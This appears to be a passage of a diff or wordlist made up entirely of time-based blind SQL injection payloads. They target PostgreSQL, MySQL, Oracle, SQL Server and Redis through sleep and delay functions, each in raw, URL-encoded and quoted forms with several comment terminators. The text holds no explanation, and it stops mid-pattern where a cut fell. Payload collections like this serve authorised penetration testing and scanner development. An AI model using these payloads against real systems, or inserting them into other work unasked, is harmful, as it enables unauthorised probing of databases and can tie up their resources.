+" AND'AND dbms_pipe.receive_message(('a'),25) --+-"
+ OR'OR dbms_pipe.receive_message(('a'),25) --+-
+%20OR%27OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
++OR%27OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+" OR'OR dbms_pipe.receive_message(('a'),25) --+-"
+' AND dbms_pipe.receive_message(('a'),25)+--+-
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+"' AND dbms_pipe.receive_message(('a'),25)+--+-"
+' OR dbms_pipe.receive_message(('a'),25)+--+-
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+"' OR dbms_pipe.receive_message(('a'),25)+--+-"
+' AND dbms_pipe.receive_message(('a'),25) --+-
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+"' AND dbms_pipe.receive_message(('a'),25) --+-"
+' OR dbms_pipe.receive_message(('a'),25) --+-
+%27%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+"' OR dbms_pipe.receive_message(('a'),25) --+-"
+' sleep(25) --+-
+%27%20sleep%2825%29%20--%2B-
+%27+sleep%2825%29+--%2B-
+"' sleep(25) --+-"
+'+sleep(25)+--+-
+%27%2Bsleep%2825%29%2B--%2B-
+"'+sleep(25)+--+-"
+ OR'+sleep(25)+--+-
+%20OR%27%2Bsleep%2825%29%2B--%2B-
+" OR'+sleep(25)+--+-"
+ AND'+sleep(25)+--+-
+%20AND%27%2Bsleep%2825%29%2B--%2B-
+" AND'+sleep(25)+--+-"
+ AND'AND sleep(25) --+-
+%20AND%27AND%20sleep%2825%29%20--%2B-
++AND%27AND+sleep%2825%29+--%2B-
+" AND'AND sleep(25) --+-"
+ OR'OR sleep(25) --+-
+%20OR%27OR%20sleep%2825%29%20--%2B-
++OR%27OR+sleep%2825%29+--%2B-
+" OR'OR sleep(25) --+-"
+' AND sleep(25)+--+-
+%27%20AND%20sleep%2825%29%2B--%2B-
+"' AND sleep(25)+--+-"
+' OR sleep(25)+--+-
+%27%20AND%20sleep%2825%29%2B--%2B-
+"' OR sleep(25)+--+-"
+' AND sleep(25) --+-
+%27%20AND%20sleep%2825%29%20--%2B-
+"' AND sleep(25) --+-"
+' OR sleep(25) --+-
+%27%20OR%20sleep%2825%29%20--%2B-
+"' OR sleep(25) --+-"
+' dbms_lock.sleep(25) --+-
+%27%20dbms_lock.sleep%2825%29%20--%2B-
+%27+dbms_lock.sleep%2825%29+--%2B-
+"' dbms_lock.sleep(25) --+-"
+'+dbms_lock.sleep(25)+--+-
+%27%2Bdbms_lock.sleep%2825%29%2B--%2B-
+"'+dbms_lock.sleep(25)+--+-"
+ OR'+dbms_lock.sleep(25)+--+-
+%20OR%27%2Bdbms_lock.sleep%2825%29%2B--%2B-
+" OR'+dbms_lock.sleep(25)+--+-"
+ AND'+dbms_lock.sleep(25)+--+-
+%20AND%27%2Bdbms_lock.sleep%2825%29%2B--%2B-
+" AND'+dbms_lock.sleep(25)+--+-"
+ AND'AND dbms_lock.sleep(25) --+-
+%20AND%27AND%20dbms_lock.sleep%2825%29%20--%2B-
++AND%27AND+dbms_lock.sleep%2825%29+--%2B-
+" AND'AND dbms_lock.sleep(25) --+-"
+ OR'OR dbms_lock.sleep(25) --+-
+%20OR%27OR%20dbms_lock.sleep%2825%29%20--%2B-
++OR%27OR+dbms_lock.sleep%2825%29+--%2B-
+" OR'OR dbms_lock.sleep(25) --+-"
+' AND dbms_lock.sleep(25)+--+-
+%27%20AND%20dbms_lock.sleep%2825%29%2B--%2B-
+"' AND dbms_lock.sleep(25)+--+-"
+' OR dbms_lock.sleep(25)+--+-
+%27%20AND%20dbms_lock.sleep%2825%29%2B--%2B-
+"' OR dbms_lock.sleep(25)+--+-"
+' AND dbms_lock.sleep(25) --+-
+%27%20AND%20dbms_lock.sleep%2825%29%20--%2B-
+"' AND dbms_lock.sleep(25) --+-"
+' OR dbms_lock.sleep(25) --+-
+%27%20OR%20dbms_lock.sleep%2825%29%20--%2B-
+"' OR dbms_lock.sleep(25) --+-"
+' redis.call("TIME")[25] --+-
+%27%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+%27+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+'\' redis.call("TIME")[25] --+-'
+'+redis.call("TIME")[25]+--+-
+%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'\'+redis.call("TIME")[25]+--+-'
+ OR'+redis.call("TIME")[25]+--+-
+%20OR%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' OR\'+redis.call("TIME")[25]+--+-'
+ AND'+redis.call("TIME")[25]+--+-
+%20AND%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' AND\'+redis.call("TIME")[25]+--+-'
+ AND'AND redis.call("TIME")[25] --+-
+%20AND%27AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
++AND%27AND+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+' AND\'AND redis.call("TIME")[25] --+-'
+ OR'OR redis.call("TIME")[25] --+-
+%20OR%27OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
++OR%27OR+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+' OR\'OR redis.call("TIME")[25] --+-'
+' AND redis.call("TIME")[25]+--+-
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'\' AND redis.call("TIME")[25]+--+-'
+' OR redis.call("TIME")[25]+--+-
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'\' OR redis.call("TIME")[25]+--+-'
+' AND redis.call("TIME")[25] --+-
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+'\' AND redis.call("TIME")[25] --+-'
+' OR redis.call("TIME")[25] --+-
+%27%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+'\' OR redis.call("TIME")[25] --+-'
+' WAITFOR DELAY '00:00:25' --+-
+%27%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+%27+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+"' WAITFOR DELAY '00:00:25' --+-"
+'+WAITFOR DELAY '00:00:25'+--+-
+%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+"'+WAITFOR DELAY '00:00:25'+--+-"
+ OR'+WAITFOR DELAY '00:00:25'+--+-
+%20OR%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+" OR'+WAITFOR DELAY '00:00:25'+--+-"
+ AND'+WAITFOR DELAY '00:00:25'+--+-
+%20AND%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+" AND'+WAITFOR DELAY '00:00:25'+--+-"
+ AND'AND WAITFOR DELAY '00:00:25' --+-
+%20AND%27AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
++AND%27AND+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+" AND'AND WAITFOR DELAY '00:00:25' --+-"
+ OR'OR WAITFOR DELAY '00:00:25' --+-
+%20OR%27OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
++OR%27OR+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+" OR'OR WAITFOR DELAY '00:00:25' --+-"
+' AND WAITFOR DELAY '00:00:25'+--+-
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+"' AND WAITFOR DELAY '00:00:25'+--+-"
+' OR WAITFOR DELAY '00:00:25'+--+-
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+"' OR WAITFOR DELAY '00:00:25'+--+-"
+' AND WAITFOR DELAY '00:00:25' --+-
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+"' AND WAITFOR DELAY '00:00:25' --+-"
+' OR WAITFOR DELAY '00:00:25' --+-
+%27%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+"' OR WAITFOR DELAY '00:00:25' --+-"
+' pg_sleep(25) #
+%27%20pg_sleep%2825%29%20%23
+%27+pg_sleep%2825%29+%23
+"' pg_sleep(25) #"
+'+pg_sleep(25)+#
+%27%2Bpg_sleep%2825%29%2B%23
+"'+pg_sleep(25)+#"
+ OR'+pg_sleep(25)+#
+%20OR%27%2Bpg_sleep%2825%29%2B%23
+" OR'+pg_sleep(25)+#"
+ AND'+pg_sleep(25)+#
+%20AND%27%2Bpg_sleep%2825%29%2B%23
+" AND'+pg_sleep(25)+#"
+ AND'AND pg_sleep(25) #
+%20AND%27AND%20pg_sleep%2825%29%20%23
++AND%27AND+pg_sleep%2825%29+%23
+" AND'AND pg_sleep(25) #"
+ OR'OR pg_sleep(25) #
+%20OR%27OR%20pg_sleep%2825%29%20%23
++OR%27OR+pg_sleep%2825%29+%23
+" OR'OR pg_sleep(25) #"
+' AND pg_sleep(25)+#
+%27%20AND%20pg_sleep%2825%29%2B%23
+"' AND pg_sleep(25)+#"
+' OR pg_sleep(25)+#
+%27%20AND%20pg_sleep%2825%29%2B%23
+"' OR pg_sleep(25)+#"
+' AND pg_sleep(25) #
+%27%20AND%20pg_sleep%2825%29%20%23
+"' AND pg_sleep(25) #"
+' OR pg_sleep(25) #
+%27%20OR%20pg_sleep%2825%29%20%23
+"' OR pg_sleep(25) #"
+' dbms_pipe.receive_message(('a'),25) #
+%27%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+%27+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+"' dbms_pipe.receive_message(('a'),25) #"
+'+dbms_pipe.receive_message(('a'),25)+#
+%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+"'+dbms_pipe.receive_message(('a'),25)+#"
+ OR'+dbms_pipe.receive_message(('a'),25)+#
+%20OR%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+" OR'+dbms_pipe.receive_message(('a'),25)+#"
+ AND'+dbms_pipe.receive_message(('a'),25)+#
+%20AND%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+" AND'+dbms_pipe.receive_message(('a'),25)+#"
+ AND'AND dbms_pipe.receive_message(('a'),25) #
+%20AND%27AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
++AND%27AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+" AND'AND dbms_pipe.receive_message(('a'),25) #"
+ OR'OR dbms_pipe.receive_message(('a'),25) #
+%20OR%27OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
++OR%27OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+" OR'OR dbms_pipe.receive_message(('a'),25) #"
+' AND dbms_pipe.receive_message(('a'),25)+#
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+"' AND dbms_pipe.receive_message(('a'),25)+#"
+' OR dbms_pipe.receive_message(('a'),25)+#
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+"' OR dbms_pipe.receive_message(('a'),25)+#"
+' AND dbms_pipe.receive_message(('a'),25) #
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+"' AND dbms_pipe.receive_message(('a'),25) #"
+' OR dbms_pipe.receive_message(('a'),25) #
+%27%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+"' OR dbms_pipe.receive_message(('a'),25) #"
+' sleep(25) #
+%27%20sleep%2825%29%20%23
+%27+sleep%2825%29+%23
+"' sleep(25) #"
+'+sleep(25)+#
+%27%2Bsleep%2825%29%2B%23
+"'+sleep(25)+#"
+ OR'+sleep(25)+#
+%20OR%27%2Bsleep%2825%29%2B%23
+" OR'+sleep(25)+#"
+ AND'+sleep(25)+#
+%20AND%27%2Bsleep%2825%29%2B%23
+" AND'+sleep(25)+#"
+ AND'AND sleep(25) #
+%20AND%27AND%20sleep%2825%29%20%23
++AND%27AND+sleep%2825%29+%23
+" AND'AND sleep(25) #"
+ OR'OR sleep(25) #
+%20OR%27OR%20sleep%2825%29%20%23
++OR%27OR+sleep%2825%29+%23
+" OR'OR sleep(25) #"
+' AND sleep(25)+#
+%27%20AND%20sleep%2825%29%2B%23
+"' AND sleep(25)+#"
+' OR sleep(25)+#
+%27%20AND%20sleep%2825%29%2B%23
+"' OR sleep(25)+#"
+' AND sleep(25) #
+%27%20AND%20sleep%2825%29%20%23
+"' AND sleep(25) #"
+' OR sleep(25) #
+%27%20OR%20sleep%2825%29%20%23
+"' OR sleep(25) #"
+' dbms_lock.sleep(25) #
+%27%20dbms_lock.sleep%2825%29%20%23
+%27+dbms_lock.sleep%2825%29+%23
+"' dbms_lock.sleep(25) #"
+'+dbms_lock.sleep(25)+#
+%27%2Bdbms_lock.sleep%2825%29%2B%23
+"'+dbms_lock.sleep(25)+#"
+ OR'+dbms_lock.sleep(25)+#
+%20OR%27%2Bdbms_lock.sleep%2825%29%2B%23
+" OR'+dbms_lock.sleep(25)+#"
+ AND'+dbms_lock.sleep(25)+#
+%20AND%27%2Bdbms_lock.sleep%2825%29%2B%23
+" AND'+dbms_lock.sleep(25)+#"
+ AND'AND dbms_lock.sleep(25) #
+%20AND%27AND%20dbms_lock.sleep%2825%29%20%23
++AND%27AND+dbms_lock.sleep%2825%29+%23
+" AND'AND dbms_lock.sleep(25) #"
+ OR'OR dbms_lock.sleep(25) #
+%20OR%27OR%20dbms_lock.sleep%2825%29%20%23
++OR%27OR+dbms_lock.sleep%2825%29+%23
+" OR'OR dbms_lock.sleep(25) #"
+' AND dbms_lock.sleep(25)+#
+%27%20AND%20dbms_lock.sleep%2825%29%2B%23
+"' AND dbms_lock.sleep(25)+#"
+' OR dbms_lock.sleep(25)+#
+%27%20AND%20dbms_lock.sleep%2825%29%2B%23
+"' OR dbms_lock.sleep(25)+#"
+' AND dbms_lock.sleep(25) #
+%27%20AND%20dbms_lock.sleep%2825%29%20%23
+"' AND dbms_lock.sleep(25) #"
+' OR dbms_lock.sleep(25) #
+%27%20OR%20dbms_lock.sleep%2825%29%20%23
+"' OR dbms_lock.sleep(25) #"
+' redis.call("TIME")[25] #
+%27%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+%27+redis.call%28%22TIME%22%29%5B25%5D+%23
+'\' redis.call("TIME")[25] #'
+'+redis.call("TIME")[25]+#
+%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+'\'+redis.call("TIME")[25]+#'
+ OR'+redis.call("TIME")[25]+#
+%20OR%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' OR\'+redis.call("TIME")[25]+#'
+ AND'+redis.call("TIME")[25]+#
+%20AND%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' AND\'+redis.call("TIME")[25]+#'
+ AND'AND redis.call("TIME")[25] #
+%20AND%27AND%20redis.call%28%22TIME%22%29%5B25%5D%20%23
++AND%27AND+redis.call%28%22TIME%22%29%5B25%5D+%23
+' AND\'AND redis.call("TIME")[25] #'
+ OR'OR redis.call("TIME")[25] #
+%20OR%27OR%20redis.call%28%22TIME%22%29%5B25%5D%20%23
++OR%27OR+redis.call%28%22TIME%22%29%5B25%5D+%23
+' OR\'OR redis.call("TIME")[25] #'
+' AND redis.call("TIME")[25]+#
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B%23
+'\' AND redis.call("TIME")[25]+#'
+' OR redis.call("TIME")[25]+#
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B%23
+'\' OR redis.call("TIME")[25]+#'
+' AND redis.call("TIME")[25] #
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+'\' AND redis.call("TIME")[25] #'
+' OR redis.call("TIME")[25] #
+%27%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+'\' OR redis.call("TIME")[25] #'
+' WAITFOR DELAY '00:00:25' #
+%27%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+%27+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+"' WAITFOR DELAY '00:00:25' #"
+'+WAITFOR DELAY '00:00:25'+#
+%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+"'+WAITFOR DELAY '00:00:25'+#"
+ OR'+WAITFOR DELAY '00:00:25'+#
+%20OR%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+" OR'+WAITFOR DELAY '00:00:25'+#"
+ AND'+WAITFOR DELAY '00:00:25'+#
+%20AND%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+" AND'+WAITFOR DELAY '00:00:25'+#"
+ AND'AND WAITFOR DELAY '00:00:25' #
+%20AND%27AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
++AND%27AND+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+" AND'AND WAITFOR DELAY '00:00:25' #"
+ OR'OR WAITFOR DELAY '00:00:25' #
+%20OR%27OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
++OR%27OR+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+" OR'OR WAITFOR DELAY '00:00:25' #"
+' AND WAITFOR DELAY '00:00:25'+#
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+"' AND WAITFOR DELAY '00:00:25'+#"
+' OR WAITFOR DELAY '00:00:25'+#
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+"' OR WAITFOR DELAY '00:00:25'+#"
+' AND WAITFOR DELAY '00:00:25' #
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+"' AND WAITFOR DELAY '00:00:25' #"
+' OR WAITFOR DELAY '00:00:25' #
+%27%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+"' OR WAITFOR DELAY '00:00:25' #"
+' pg_sleep(25) /**/
+%27%20pg_sleep%2825%29%20/%2A%2A/
+%27+pg_sleep%2825%29+%2F%2A%2A%2F
+"' pg_sleep(25) /**/"
+'+pg_sleep(25)+/**/
+%27%2Bpg_sleep%2825%29%2B/%2A%2A/
+"'+pg_sleep(25)+/**/"
+ OR'+pg_sleep(25)+/**/
+%20OR%27%2Bpg_sleep%2825%29%2B/%2A%2A/
+" OR'+pg_sleep(25)+/**/"
+ AND'+pg_sleep(25)+/**/
+%20AND%27%2Bpg_sleep%2825%29%2B/%2A%2A/
+" AND'+pg_sleep(25)+/**/"
+ AND'AND pg_sleep(25) /**/
+%20AND%27AND%20pg_sleep%2825%29%20/%2A%2A/
++AND%27AND+pg_sleep%2825%29+%2F%2A%2A%2F
+" AND'AND pg_sleep(25) /**/"
+ OR'OR pg_sleep(25) /**/
+%20OR%27OR%20pg_sleep%2825%29%20/%2A%2A/
++OR%27OR+pg_sleep%2825%29+%2F%2A%2A%2F
+" OR'OR pg_sleep(25) /**/"
+' AND pg_sleep(25)+/**/
+%27%20AND%20pg_sleep%2825%29%2B/%2A%2A/
+"' AND pg_sleep(25)+/**/"
+' OR pg_sleep(25)+/**/
+%27%20AND%20pg_sleep%2825%29%2B/%2A%2A/
+"' OR pg_sleep(25)+/**/"
+' AND pg_sleep(25) /**/
+%27%20AND%20pg_sleep%2825%29%20/%2A%2A/
+"' AND pg_sleep(25) /**/"
+' OR pg_sleep(25) /**/
+%27%20OR%20pg_sleep%2825%29%20/%2A%2A/
+"' OR pg_sleep(25) /**/"
+' dbms_pipe.receive_message(('a'),25) /**/
+%27%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+%27+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+"' dbms_pipe.receive_message(('a'),25) /**/"
+'+dbms_pipe.receive_message(('a'),25)+/**/
+%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+"'+dbms_pipe.receive_message(('a'),25)+/**/"
+ OR'+dbms_pipe.receive_message(('a'),25)+/**/
+%20OR%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+" OR'+dbms_pipe.receive_message(('a'),25)+/**/"
+ AND'+dbms_pipe.receive_message(('a'),25)+/**/
+%20AND%27%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+" AND'+dbms_pipe.receive_message(('a'),25)+/**/"
+ AND'AND dbms_pipe.receive_message(('a'),25) /**/
+%20AND%27AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
++AND%27AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+" AND'AND dbms_pipe.receive_message(('a'),25) /**/"
+ OR'OR dbms_pipe.receive_message(('a'),25) /**/
+%20OR%27OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
++OR%27OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+" OR'OR dbms_pipe.receive_message(('a'),25) /**/"
+' AND dbms_pipe.receive_message(('a'),25)+/**/
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+"' AND dbms_pipe.receive_message(('a'),25)+/**/"
+' OR dbms_pipe.receive_message(('a'),25)+/**/
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+"' OR dbms_pipe.receive_message(('a'),25)+/**/"
+' AND dbms_pipe.receive_message(('a'),25) /**/
+%27%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+"' AND dbms_pipe.receive_message(('a'),25) /**/"
+' OR dbms_pipe.receive_message(('a'),25) /**/
+%27%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+"' OR dbms_pipe.receive_message(('a'),25) /**/"
+' sleep(25) /**/
+%27%20sleep%2825%29%20/%2A%2A/
+%27+sleep%2825%29+%2F%2A%2A%2F
+"' sleep(25) /**/"
+'+sleep(25)+/**/
+%27%2Bsleep%2825%29%2B/%2A%2A/
+"'+sleep(25)+/**/"
+ OR'+sleep(25)+/**/
+%20OR%27%2Bsleep%2825%29%2B/%2A%2A/
+" OR'+sleep(25)+/**/"
+ AND'+sleep(25)+/**/
+%20AND%27%2Bsleep%2825%29%2B/%2A%2A/
+" AND'+sleep(25)+/**/"
+ AND'AND sleep(25) /**/
+%20AND%27AND%20sleep%2825%29%20/%2A%2A/
++AND%27AND+sleep%2825%29+%2F%2A%2A%2F
+" AND'AND sleep(25) /**/"
+ OR'OR sleep(25) /**/
+%20OR%27OR%20sleep%2825%29%20/%2A%2A/
++OR%27OR+sleep%2825%29+%2F%2A%2A%2F
+" OR'OR sleep(25) /**/"
+' AND sleep(25)+/**/
+%27%20AND%20sleep%2825%29%2B/%2A%2A/
+"' AND sleep(25)+/**/"
+' OR sleep(25)+/**/
+%27%20AND%20sleep%2825%29%2B/%2A%2A/
+"' OR sleep(25)+/**/"
+' AND sleep(25) /**/
+%27%20AND%20sleep%2825%29%20/%2A%2A/
+"' AND sleep(25) /**/"
+' OR sleep(25) /**/
+%27%20OR%20sleep%2825%29%20/%2A%2A/
+"' OR sleep(25) /**/"
+' dbms_lock.sleep(25) /**/
+%27%20dbms_lock.sleep%2825%29%20/%2A%2A/
+%27+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+"' dbms_lock.sleep(25) /**/"
+'+dbms_lock.sleep(25)+/**/
+%27%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+"'+dbms_lock.sleep(25)+/**/"
+ OR'+dbms_lock.sleep(25)+/**/
+%20OR%27%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+" OR'+dbms_lock.sleep(25)+/**/"
+ AND'+dbms_lock.sleep(25)+/**/
+%20AND%27%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+" AND'+dbms_lock.sleep(25)+/**/"
+ AND'AND dbms_lock.sleep(25) /**/
+%20AND%27AND%20dbms_lock.sleep%2825%29%20/%2A%2A/
++AND%27AND+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+" AND'AND dbms_lock.sleep(25) /**/"
+ OR'OR dbms_lock.sleep(25) /**/
+%20OR%27OR%20dbms_lock.sleep%2825%29%20/%2A%2A/
++OR%27OR+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+" OR'OR dbms_lock.sleep(25) /**/"
+' AND dbms_lock.sleep(25)+/**/
+%27%20AND%20dbms_lock.sleep%2825%29%2B/%2A%2A/
+"' AND dbms_lock.sleep(25)+/**/"
+' OR dbms_lock.sleep(25)+/**/
+%27%20AND%20dbms_lock.sleep%2825%29%2B/%2A%2A/
+"' OR dbms_lock.sleep(25)+/**/"
+' AND dbms_lock.sleep(25) /**/
+%27%20AND%20dbms_lock.sleep%2825%29%20/%2A%2A/
+"' AND dbms_lock.sleep(25) /**/"
+' OR dbms_lock.sleep(25) /**/
+%27%20OR%20dbms_lock.sleep%2825%29%20/%2A%2A/
+"' OR dbms_lock.sleep(25) /**/"
+' redis.call("TIME")[25] /**/
+%27%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+%27+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+'\' redis.call("TIME")[25] /**/'
+'+redis.call("TIME")[25]+/**/
+%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'\'+redis.call("TIME")[25]+/**/'
+ OR'+redis.call("TIME")[25]+/**/
+%20OR%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' OR\'+redis.call("TIME")[25]+/**/'
+ AND'+redis.call("TIME")[25]+/**/
+%20AND%27%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' AND\'+redis.call("TIME")[25]+/**/'
+ AND'AND redis.call("TIME")[25] /**/
+%20AND%27AND%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
++AND%27AND+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+' AND\'AND redis.call("TIME")[25] /**/'
+ OR'OR redis.call("TIME")[25] /**/
+%20OR%27OR%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
++OR%27OR+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+' OR\'OR redis.call("TIME")[25] /**/'
+' AND redis.call("TIME")[25]+/**/
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'\' AND redis.call("TIME")[25]+/**/'
+' OR redis.call("TIME")[25]+/**/
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'\' OR redis.call("TIME")[25]+/**/'
+' AND redis.call("TIME")[25] /**/
+%27%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+'\' AND redis.call("TIME")[25] /**/'
+' OR redis.call("TIME")[25] /**/
+%27%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+'\' OR redis.call("TIME")[25] /**/'
+' WAITFOR DELAY '00:00:25' /**/
+%27%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+%27+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+"' WAITFOR DELAY '00:00:25' /**/"
+'+WAITFOR DELAY '00:00:25'+/**/
+%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+"'+WAITFOR DELAY '00:00:25'+/**/"
+ OR'+WAITFOR DELAY '00:00:25'+/**/
+%20OR%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+" OR'+WAITFOR DELAY '00:00:25'+/**/"
+ AND'+WAITFOR DELAY '00:00:25'+/**/
+%20AND%27%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+" AND'+WAITFOR DELAY '00:00:25'+/**/"
+ AND'AND WAITFOR DELAY '00:00:25' /**/
+%20AND%27AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
++AND%27AND+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+" AND'AND WAITFOR DELAY '00:00:25' /**/"
+ OR'OR WAITFOR DELAY '00:00:25' /**/
+%20OR%27OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
++OR%27OR+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+" OR'OR WAITFOR DELAY '00:00:25' /**/"
+' AND WAITFOR DELAY '00:00:25'+/**/
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+"' AND WAITFOR DELAY '00:00:25'+/**/"
+' OR WAITFOR DELAY '00:00:25'+/**/
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+"' OR WAITFOR DELAY '00:00:25'+/**/"
+' AND WAITFOR DELAY '00:00:25' /**/
+%27%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+"' AND WAITFOR DELAY '00:00:25' /**/"
+' OR WAITFOR DELAY '00:00:25' /**/
+%27%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+"' OR WAITFOR DELAY '00:00:25' /**/"
+' pg_sleep(25) -- -
